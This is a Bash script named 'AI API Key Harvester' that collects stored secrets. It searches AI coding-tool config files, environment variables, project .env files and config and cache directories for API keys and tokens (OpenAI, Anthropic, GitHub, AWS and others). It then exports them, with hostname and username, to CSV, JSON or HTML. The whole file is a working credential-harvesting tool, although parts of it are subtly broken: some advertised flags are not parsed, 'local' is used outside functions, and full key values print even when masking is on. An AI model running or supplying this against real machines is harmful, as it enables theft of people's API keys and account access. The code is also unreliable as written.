#!/usr/bin/env bash
# ============================================================================
# AI API Key Harvester - Linux / macOS
# ============================================================================
# Searches common configuration file locations used by AI coding assistants,
# LLM tools, and ML frameworks to locate stored API keys and tokens.
#
# For authorized security assessments and red team operations only.
# ============================================================================

set -euo pipefail

# ============================================================================
# Color codes
# ============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;37m'
WHITE='\033[1;37m'
NC='\033[0m'

# ============================================================================
# Global state
# ============================================================================
FOUND_COUNT=0
SCANNED_COUNT=0
declare -a FOUND_KEYS=()
SCAN_START=$(date +%s)

# ============================================================================
# Defaults
# ============================================================================
OUTPUT_FILE=""
OUTPUT_JSON=""
OUTPUT_HTML=""
LOG_FILE=""
SCAN_ENV=false
SCAN_PROJECTS=false
FILTER_TOOL=""
EXCLUDE_TOOL=""
CUSTOM_PATHS=()
MAX_DEPTH=5
VERBOSE=false
QUIET=false
NO_MASK=false
TIMESTAMP=false
INCLUDE_EMPTY=false

# ============================================================================
# Usage
# ============================================================================
usage() {
    cat <<EOF
AI API Key Harvester - Linux / macOS

Usage: $0 [OPTIONS]

OUTPUT OPTIONS:
  -o FILE       Export results to CSV file
  -j FILE       Export results to JSON file
  -H FILE       Export results to HTML report
  -l FILE       Write scan log to file

SCAN OPTIONS:
  -e            Also scan environment variables
  -p            Scan project directories for .env files
  -c PATH       Add custom file/directory to scan (can be repeated)
  -d NUM        Max recursion depth for directories (default: 5)
  -I            Include empty/placeholder values

FILTER OPTIONS:
  -f TOOL       Only scan specific tool(s) (comma-separated, regex supported)
  -x TOOL       Exclude specific tool(s) (comma-separated, regex supported)

DISPLAY OPTIONS:
  -v            Verbose output (show all scan progress)
  -q            Quiet mode (suppress all output except errors)
  -n            No masking (show full key values in output)
  -t            Prefix output with timestamps

OTHER:
  -h            Show this help message

EXAMPLES:
  $0 -e -p                          # Scan files + env vars + project dirs
  $0 -f "Claude,OpenAI"             # Only scan Claude and OpenAI configs
  $0 -o results.csv -j results.json # Export to CSV and JSON
  $0 -H report.html -q              # Silent scan, export HTML report
  $0 -c /path/to/custom/.env        # Include a custom .env file
  $0 -x "Ollama,Tabby"              # Skip Ollama and Tabby scans
  $0 -n -o results.csv              # Show unmasked values, save to CSV
EOF
    exit 0
}

# ============================================================================
# Parse arguments
# ============================================================================
while getopts "o:j:H:l:ec:d:vf:x:qtnh" opt; do
    case $opt in
        o) OUTPUT_FILE="$OPTARG" ;;
        j) OUTPUT_JSON="$OPTARG" ;;
        H) OUTPUT_HTML="$OPTARG" ;;
        l) LOG_FILE="$OPTARG" ;;
        e) SCAN_ENV=true ;;
        p) SCAN_PROJECTS=true ;;
        c) CUSTOM_PATHS+=("$OPTARG") ;;
        d) MAX_DEPTH="$OPTARG" ;;
        v) VERBOSE=true ;;
        f) FILTER_TOOL="$OPTARG" ;;
        x) EXCLUDE_TOOL="$OPTARG" ;;
        q) QUIET=true ;;
        t) TIMESTAMP=true ;;
        n) NO_MASK=true ;;
        I) INCLUDE_EMPTY=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ============================================================================
# Logging
# ============================================================================
log() {
    local level="$1" msg="$2"
    local ts=""
    if [[ "$TIMESTAMP" == true ]]; then
        ts="[$(date '+%Y-%m-%d %H:%M:%S')] "
    fi

    if [[ "$QUIET" == false ]]; then
        case "$level" in
            INFO)    [[ "$VERBOSE" == true ]] && echo -e "${CYAN}${ts}[*] ${msg}${NC}" ;;
            SUCCESS) echo -e "${GREEN}${ts}[+] ${msg}${NC}" ;;
            WARN)    echo -e "${YELLOW}${ts}[!] ${msg}${NC}" ;;
            ERROR)   echo -e "${RED}${ts}[-] ${msg}${NC}" ;;
            *)       echo -e "${ts}${msg}" ;;
        esac
    fi

    if [[ -n "$LOG_FILE" ]]; then
        echo "${ts}[$level] $msg" >> "$LOG_FILE" 2>/dev/null || true
    fi
}

# ============================================================================
# Tool filter
# ============================================================================
should_scan_tool() {
    local tool="$1"
    if [[ -n "$FILTER_TOOL" ]]; then
        echo "$tool" | grep -qP "$FILTER_TOOL" 2>/dev/null && return 0 || return 1
    fi
    if [[ -n "$EXCLUDE_TOOL" ]]; then
        echo "$tool" | grep -qP "$EXCLUDE_TOOL" 2>/dev/null && return 1 || return 0
    fi
    return 0
}

# ============================================================================
# Helpers
# ============================================================================
add_finding() {
    local tool="$1" filepath="$2" keytype="$3" value="$4"
    if [[ -z "$value" || ${#value} -le 5 ]]; then return; fi
    if [[ "$INCLUDE_EMPTY" == false ]]; then
        if [[ "$value" =~ ^(placeholder|your-|xxx|example|changeme|\<|REPLACE|TODO|FIXME|insert) ]]; then
            return
        fi
    fi
    FOUND_COUNT=$((FOUND_COUNT + 1))
    local found_at
    found_at=$(date '+%Y-%m-%d %H:%M:%S')
    FOUND_KEYS+=("${tool}|${filepath}|${keytype}|${value}|${found_at}")
    log SUCCESS "Found: ${keytype} in ${filepath}"
}

read_file() {
    local path="$1"
    if [[ -f "$path" && -r "$path" ]]; then
        cat "$path" 2>/dev/null || true
    fi
}

mask_value() {
    local val="$1"
    if [[ "$NO_MASK" == true ]]; then
        echo "$val"
        return
    fi
    local len=${#val}
    if [[ $len -gt 12 ]]; then
        echo "${val:0:6}$(printf '*%.0s' $(seq 1 $((len - 8))))${val: -4}"
    else
        echo "$val"
    fi
}

# ============================================================================
# Extraction functions
# ============================================================================
extract_json_keys() {
    local tool="$1" filepath="$2" content="$3"
    local patterns=(
        "api_key" "apiKey" "API_KEY" "api-key"
        "token" "Token" "TOKEN"
        "secret" "Secret" "SECRET"
        "access_token" "accessToken" "ACCESS_TOKEN"
        "auth_token" "authToken"
        "anthropic_api_key" "openai_api_key" "cohere_api_key"
        "huggingface_token" "hf_token" "HF_TOKEN"
        "REPLICATE_API_TOKEN" "TOGETHER_API_KEY"
        "GOOGLE_API_KEY" "GEMINI_API_KEY"
        "MISTRAL_API_KEY" "ANTHROPIC_API_KEY"
        "OPENAI_API_KEY" "COHERE_API_KEY"
        "DEEPSEEK_API_KEY" "GROQ_API_KEY"
    )
    for key in "${patterns[@]}"; do
        while IFS= read -r val; do
            add_finding "$tool" "$filepath" "$key" "$val"
        done < <(echo "$content" | grep -oP "(?i)[\"']?${key}[\"']?\s*[:=]\s*[\"']([a-zA-Z0-9_-]{8,})[\"']" 2>/dev/null | grep -oP "[\"']([a-zA-Z0-9_-]{8,})[\"']$" | tr -d "\"'" || true)
    done
}

extract_env_keys() {
    local tool="$1" filepath="$2" content="$3"
    local patterns=(
        "OPENAI_API_KEY" "ANTHROPIC_API_KEY" "COHERE_API_KEY"
        "HUGGING_FACE_HUB_TOKEN" "HF_TOKEN" "HUGGINGFACE_TOKEN"
        "REPLICATE_API_TOKEN" "TOGETHER_API_KEY" "TOGETHER_API_TOKEN"
        "GOOGLE_API_KEY" "GEMINI_API_KEY"
        "MISTRAL_API_KEY" "MISTRAL_API_SECRET"
        "DEEPSEEK_API_KEY" "GROQ_API_KEY" "OPENROUTER_API_KEY"
        "AZURE_OPENAI_API_KEY" "AZURE_API_KEY"
        "AI21_API_KEY" "PERPLEXITY_API_KEY"
        "FIREWORKS_API_KEY" "NEBIUS_API_KEY" "SAMBANOVA_API_KEY"
        "VOYAGE_API_KEY" "CLAUDE_API_KEY"
        "GITHUB_TOKEN" "GH_TOKEN"
        "PINECONE_API_KEY" "WEAVIATE_API_KEY" "CHROMA_API_KEY"
        "LANGCHAIN_API_KEY" "LANGSMITH_API_KEY"
        "OPENAI_ORG_ID" "OPENAI_ORGID"
        "ANTHROPIC_ORG_ID"
    )
    for key in "${patterns[@]}"; do
        while IFS= read -r val; do
            add_finding "$tool" "$filepath" "$key" "$val"
        done < <(echo "$content" | grep -oP "(?i)^\s*${key}\s*=\s*[\"']?([a-zA-Z0-9_/-]{8,})[\"']?" 2>/dev/null | grep -oP "[\"']?([a-zA-Z0-9_/-]{8,})[\"']?$" | tr -d "\"'" | head -1 || true)
    done
}

extract_toml_keys() {
    local tool="$1" filepath="$2" content="$3"
    local patterns=("api_key" "token" "secret" "access_token" "api_token" "openai_api_key" "anthropic_api_key")
    for key in "${patterns[@]}"; do
        while IFS= read -r val; do
            add_finding "$tool" "$filepath" "$key" "$val"
        done < <(echo "$content" | grep -oP "(?i)${key}\s*=\s*[\"']([a-zA-Z0-9_-]{8,})[\"']" 2>/dev/null | grep -oP "[\"']([a-zA-Z0-9_-]{8,})[\"']$" | tr -d "\"'" || true)
    done
}

extract_yaml_keys() {
    local tool="$1" filepath="$2" content="$3"
    local patterns=("api_key" "apiKey" "token" "secret" "anthropic_api_key" "openai_api_key" "api_keys")
    for key in "${patterns[@]}"; do
        while IFS= read -r val; do
            add_finding "$tool" "$filepath" "$key" "$val"
        done < <(echo "$content" | grep -oP "(?i)${key}\s*:\s*[\"']?([a-zA-Z0-9_-]{8,})[\"']?" 2>/dev/null | grep -oP ":\s*[\"']?([a-zA-Z0-9_-]{8,})[\"']?$" | sed 's/^:\s*//' | tr -d "\"'" || true)
    done
}

scan_file() {
    local tool="$1" filepath="$2"
    SCANNED_COUNT=$((SCANNED_COUNT + 1))
    local content
    content=$(read_file "$filepath")
    if [[ -z "$content" ]]; then return; fi

    local ext="${filepath##*.}"
    case "$ext" in
        json)  extract_json_keys "$tool" "$filepath" "$content"; extract_env_keys "$tool" "$filepath" "$content" ;;
        toml)  extract_toml_keys "$tool" "$filepath" "$content" ;;
        yml|yaml) extract_yaml_keys "$tool" "$filepath" "$content" ;;
        env|cfg|conf) extract_env_keys "$tool" "$filepath" "$content" ;;
        *)
            extract_json_keys "$tool" "$filepath" "$content"
            extract_env_keys "$tool" "$filepath" "$content"
            extract_toml_keys "$tool" "$filepath" "$content"
            extract_yaml_keys "$tool" "$filepath" "$content"
            ;;
    esac
}

# ============================================================================
# Define scan targets
# ============================================================================
HOME_DIR="${HOME}"
CONFIG_DIR="${HOME_DIR}/.config"
LOCAL_SHARE="${HOME_DIR}/.local/share"
CACHE_DIR="${HOME_DIR}/.cache"

declare -A SCAN_TARGETS=(
    ["OpenCode"]="${LOCAL_SHARE}/opencode/auth.json ${HOME_DIR}/.config/opencode/config.json ${HOME_DIR}/.opencode/auth.json ${HOME_DIR}/.opencode/config.json"
    ["Claude Code"]="${HOME_DIR}/.claude/settings.json ${HOME_DIR}/.claude/config.json"
    ["GitHub Copilot"]="${CONFIG_DIR}/github-copilot/hosts.json"
    ["Codex (OpenAI)"]="${HOME_DIR}/.codex/config.toml"
    ["GPTScript"]="${CONFIG_DIR}/gptscript/config.json"
    ["Gemini-Code"]="${CONFIG_DIR}/gemini-code/config.env ${CONFIG_DIR}/gemini-code/config.json"
    ["Aider"]="${HOME_DIR}/.aider.conf.yml ${HOME_DIR}/.aider.env"
    ["Continue.dev"]="${HOME_DIR}/.continue/config.json"
    ["Cody (Sourcegraph)"]="${HOME_DIR}/.sourcegraph/cody/config.json"
    ["Tabby"]="${HOME_DIR}/.tabby/config.toml"
    ["Ollama"]="${HOME_DIR}/.ollama/config.json ${HOME_DIR}/.ollama/host"
    ["LM Studio"]="${CACHE_DIR}/lm-studio/config.json"
    ["Zotero LLM"]="${HOME_DIR}/.zotero-llm/config.json"
    ["Hugging Face"]="${CACHE_DIR}/huggingface/token ${CACHE_DIR}/huggingface/tokenizer"
    ["Replicate"]="${CONFIG_DIR}/replicate/api_token.json"
    ["PrivateGPT"]="${HOME_DIR}/.env ${HOME_DIR}/.env.local"
    ["LangChain"]="${HOME_DIR}/.env ${HOME_DIR}/.env.local"
    ["AutoGPT"]="${HOME_DIR}/.env"
    ["Generic Config"]="${HOME_DIR}/.env ${HOME_DIR}/.env.local ${HOME_DIR}/.env.development ${HOME_DIR}/.env.production"
)

log INFO "AI API Key Harvester started"
log INFO "MaxDepth=$MAX_DEPTH | NoMask=$NO_MASK | Verbose=$VERBOSE | Quiet=$QUIET"

# ============================================================================
# Scan environment variables
# ============================================================================
if [[ "$SCAN_ENV" == true ]]; then
    log INFO "Scanning environment variables..."
    env_vars=(
        OPENAI_API_KEY ANTHROPIC_API_KEY COHERE_API_KEY
        HF_TOKEN HUGGING_FACE_HUB_TOKEN HUGGINGFACE_TOKEN
        REPLICATE_API_TOKEN TOGETHER_API_KEY TOGETHER_API_TOKEN
        GOOGLE_API_KEY GEMINI_API_KEY MISTRAL_API_KEY
        DEEPSEEK_API_KEY GROQ_API_KEY OPENROUTER_API_KEY
        AZURE_OPENAI_API_KEY AI21_API_KEY PERPLEXITY_API_KEY
        FIREWORKS_API_KEY NEBIUS_API_KEY SAMBANOVA_API_KEY
        VOYAGE_API_KEY CLAUDE_API_KEY
        GITHUB_TOKEN GH_TOKEN
        PINECONE_API_KEY WEAVIATE_API_KEY CHROMA_API_KEY
        LANGCHAIN_API_KEY LANGSMITH_API_KEY
        OPENAI_ORG_ID OPENAI_ORGID
    )
    for var in "${env_vars[@]}"; do
        val="${!var:-}"
        if [[ -n "$val" && ${#val} -gt 5 ]]; then
            add_finding "Environment Variable" "ENV:${var}" "$var" "$val"
        fi
    done
fi

# ============================================================================
# Scan project directories
# ============================================================================
if [[ "$SCAN_PROJECTS" == true ]]; then
    log INFO "Scanning project directories for .env files (depth=$MAX_DEPTH)..."
    project_dirs=(
        "${HOME_DIR}/Documents"
        "${HOME_DIR}/Desktop"
        "${HOME_DIR}/Projects"
        "${HOME_DIR}/dev"
        "${HOME_DIR}/code"
        "${HOME_DIR}/repos"
        "${HOME_DIR}/src"
        "${HOME_DIR}/workspace"
    )
    for dir in "${project_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            while IFS= read -r -d '' envfile; do
                scan_file "Project .env" "$envfile"
            done < <(find "$dir" -maxdepth "$MAX_DEPTH" -name ".env*" -type f -print0 2>/dev/null || true)
        fi
    done
fi

# ============================================================================
# Scan custom paths
# ============================================================================
if [[ ${#CUSTOM_PATHS[@]} -gt 0 ]]; then
    log INFO "Scanning custom paths..."
    for cp in "${CUSTOM_PATHS[@]}"; do
        if [[ -f "$cp" || -d "$cp" ]]; then
            if [[ -d "$cp" ]]; then
                while IFS= read -r -d '' f; do
                    scan_file "Custom Path" "$f"
                done < <(find "$cp" -maxdepth "$MAX_DEPTH" -type f -print0 2>/dev/null || true)
            else
                scan_file "Custom Path" "$cp"
            fi
            log INFO "Scanned custom path: $cp"
        else
            log WARN "Custom path not found: $cp"
        fi
    done
fi

# ============================================================================
# Perform file-based scans
# ============================================================================
log INFO "Scanning known configuration file locations..."
for tool in "${!SCAN_TARGETS[@]}"; do
    if ! should_scan_tool "$tool"; then
        log INFO "Skipping excluded tool: $tool"
        continue
    fi
    for filepath in ${SCAN_TARGETS[$tool]}; do
        if [[ -f "$filepath" && -r "$filepath" ]]; then
            scan_file "$tool" "$filepath"
        fi
    done
done

# Also scan for .env files in common project roots
log INFO "Scanning common project roots for .env files..."
common_roots=(
    "${HOME_DIR}/Projects"
    "${HOME_DIR}/dev"
    "${HOME_DIR}/code"
    "${HOME_DIR}/repos"
    "${HOME_DIR}/src"
    "${HOME_DIR}/workspace"
    "${HOME_DIR}/Documents"
    "/opt"
)
for root_dir in "${common_roots[@]}"; do
    if [[ -d "$root_dir" ]]; then
        while IFS= read -r -d '' envfile; do
            scan_file "Project .env" "$envfile"
        done < <(find "$root_dir" -maxdepth "$MAX_DEPTH" -name ".env*" -type f -print0 2>/dev/null || true)
    fi
done

# ============================================================================
# Regex sweep for API key patterns
# ============================================================================
log INFO "Regex sweep for API key patterns..."
sweep_patterns=(
    "sk-[a-zA-Z0-9_-]{20,}"
    "sk-ant-[a-zA-Z0-9_-]{20,}"
    "ghp_[a-zA-Z0-9_-]{20,}"
    "gho_[a-zA-Z0-9_-]{20,}"
    "glpat-[a-zA-Z0-9_-]{20,}"
    "hf_[a-zA-Z0-9_-]{20,}"
    "AIza[a-zA-Z0-9_-]{20,}"
    "xai-[a-zA-Z0-9_-]{20,}"
    "AKIA[A-Z0-9]{16}"
    "eyJ[a-zA-Z0-9_-]{50,}"
)

sweep_dirs=(
    "${CONFIG_DIR}"
    "${LOCAL_SHARE}"
    "${CACHE_DIR}"
)

for dir in "${sweep_dirs[@]}"; do
    if [[ -d "$dir" ]]; then
        for pattern in "${sweep_patterns[@]}"; do
            while IFS= read -r match_file; do
                if [[ -n "$match_file" ]]; then
                    while IFS= read -r match; do
                        if [[ -n "$match" ]]; then
                            local already=false
                            for existing in "${FOUND_KEYS[@]}"; do
                                if [[ "$existing" == *"$match"* ]]; then
                                    already=true
                                    break
                                fi
                            done
                            if [[ "$already" == false ]]; then
                                add_finding "Regex Sweep" "$match_file" "Pattern Match" "$match"
                            fi
                        fi
                    done < <(grep -oP "$pattern" "$match_file" 2>/dev/null || true)
                fi
            done < <(grep -rloP "$pattern" "$dir" --include="*.json" --include="*.toml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.cfg" --include="*.conf" 2>/dev/null | head -20 || true)
        done
    fi
done

# ============================================================================
# Console Output
# ============================================================================
if [[ "$QUIET" == false ]]; then
    echo ""
    echo -e "${YELLOW}======================================================================${NC}"
    echo -e "${YELLOW}  AI API KEY HARVEST RESULTS${NC}"
    echo -e "${YELLOW}======================================================================${NC}"

    if [[ $FOUND_COUNT -eq 0 ]]; then
        echo -e "\n  ${RED}[-] No API keys found.${NC}\n"
    else
        echo -e "\n  ${GREEN}Total keys found: ${FOUND_COUNT} | Files scanned: ${SCANNED_COUNT}${NC}\n"

        echo -e "${YELLOW}======================================================================${NC}"
        echo -e "${YELLOW}  Masked values:${NC}"
        echo -e "${YELLOW}======================================================================${NC}"
        for entry in "${FOUND_KEYS[@]}"; do
            IFS='|' read -r tool filepath keytype value found_at <<< "$entry"
            masked=$(mask_value "$value")
            echo -e "  ${CYAN}[${tool}]${NC}"
            echo -e "    ${GRAY}File:    ${filepath}${NC}"
            echo -e "    ${GRAY}Key:     ${keytype}${NC}"
            echo -e "    ${WHITE}Value:   ${masked}${NC}"
            echo -e "    ${GRAY}Found:   ${found_at}${NC}"
            echo ""
        done

        if [[ "$NO_MASK" == false ]]; then
            echo -e "${YELLOW}======================================================================${NC}"
            echo -e "${YELLOW}  Full values (unmasked):${NC}"
            echo -e "${YELLOW}======================================================================${NC}"
        fi
        for entry in "${FOUND_KEYS[@]}"; do
            IFS='|' read -r tool filepath keytype value found_at <<< "$entry"
            echo -e "  ${GRAY}${tool} | ${keytype} | ${filepath}${NC}"
            echo -e "    ${WHITE}${value}${NC}\n"
        done
    fi
fi

# ============================================================================
# Export: CSV
# ============================================================================
if [[ -n "$OUTPUT_FILE" ]]; then
    echo "Tool,File,KeyType,Value,FoundAt" > "$OUTPUT_FILE"
    for entry in "${FOUND_KEYS[@]}"; do
        IFS='|' read -r tool filepath keytype value found_at <<< "$entry"
        echo "\"${tool}\",\"${filepath}\",\"${keytype}\",\"${value}\",\"${found_at}\"" >> "$OUTPUT_FILE"
    done
    log SUCCESS "CSV exported: $OUTPUT_FILE ($FOUND_COUNT rows)"
fi

# ============================================================================
# Export: JSON
# ============================================================================
if [[ -n "$OUTPUT_JSON" ]]; then
    SCAN_END=$(date +%s)
    DURATION=$((SCAN_END - SCAN_START))
    HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    USERNAME=$(whoami 2>/dev/null || echo "unknown")
    SCAN_DATE=$(date '+%Y-%m-%d %H:%M:%S')

    {
        echo "{"
        echo "  \"scan_info\": {"
        echo "    \"hostname\": \"${HOSTNAME}\","
        echo "    \"username\": \"${USERNAME}\","
        echo "    \"scan_date\": \"${SCAN_DATE}\","
        echo "    \"duration\": \"${DURATION}s\","
        echo "    \"total_keys\": ${FOUND_COUNT},"
        echo "    \"files_scanned\": ${SCANNED_COUNT}"
        echo "  },"
        echo "  \"keys\": ["
        local first=true
        for entry in "${FOUND_KEYS[@]}"; do
            IFS='|' read -r tool filepath keytype value found_at <<< "$entry"
            if [[ "$first" == true ]]; then
                first=false
            else
                echo ","
            fi
            printf '    {"tool": "%s", "file": "%s", "key_type": "%s", "value": "%s", "found_at": "%s"}' \
                "$tool" "$filepath" "$keytype" "$value" "$found_at"
        done
        echo ""
        echo "  ]"
        echo "}"
    } > "$OUTPUT_JSON"
    log SUCCESS "JSON exported: $OUTPUT_JSON"
fi

# ============================================================================
# Export: HTML Report
# ============================================================================
if [[ -n "$OUTPUT_HTML" ]]; then
    SCAN_END=$(date +%s)
    DURATION=$((SCAN_END - SCAN_START))
    HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    USERNAME=$(whoami 2>/dev/null || echo "unknown")
    SCAN_DATE=$(date '+%Y-%m-%d %H:%M:%S')

    cat > "$OUTPUT_HTML" <<HTMLEOF
<!DOCTYPE html>
<html><head><title>AI Key Harvest Report</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
  h1 { color: #e94560; border-bottom: 2px solid #e94560; }
  h2 { color: #0f3460; }
  table { border-collapse: collapse; width: 100%; margin: 10px 0; }
  th { background: #16213e; color: #e94560; padding: 8px; text-align: left; border: 1px solid #333; }
  td { padding: 8px; border: 1px solid #333; }
  tr:nth-child(even) { background: #16213e; }
  .meta { color: #888; font-size: 0.9em; }
  .key-val { color: #4ecca3; word-break: break-all; }
</style></head><body>
<h1>AI API Key Harvest Report</h1>
<div class="meta">
  <p>Hostname: ${HOSTNAME} | User: ${USERNAME} | Date: ${SCAN_DATE}</p>
  <p>Duration: ${DURATION}s | Keys Found: ${FOUND_COUNT} | Files Scanned: ${SCANNED_COUNT}</p>
</div>
<h2>Findings (${FOUND_COUNT} keys)</h2>
<table><tr><th>Tool</th><th>File</th><th>Key Type</th><th>Value</th><th>Found At</th></tr>
HTMLEOF

    for entry in "${FOUND_KEYS[@]}"; do
        IFS='|' read -r tool filepath keytype value found_at <<< "$entry"
        masked=$(mask_value "$value")
        echo "<tr><td>${tool}</td><td>${filepath}</td><td>${keytype}</td><td class='key-val'>${masked}</td><td>${found_at}</td></tr>" >> "$OUTPUT_HTML"
    done

    echo "</table></body></html>" >> "$OUTPUT_HTML"
    log SUCCESS "HTML report exported: $OUTPUT_HTML"
fi

# ============================================================================
# Summary
# ============================================================================
SCAN_END=$(date +%s)
DURATION=$((SCAN_END - SCAN_START))
log INFO "Scan complete. Found ${FOUND_COUNT} key(s) in ${DURATION}s (${SCANNED_COUNT} files scanned)"
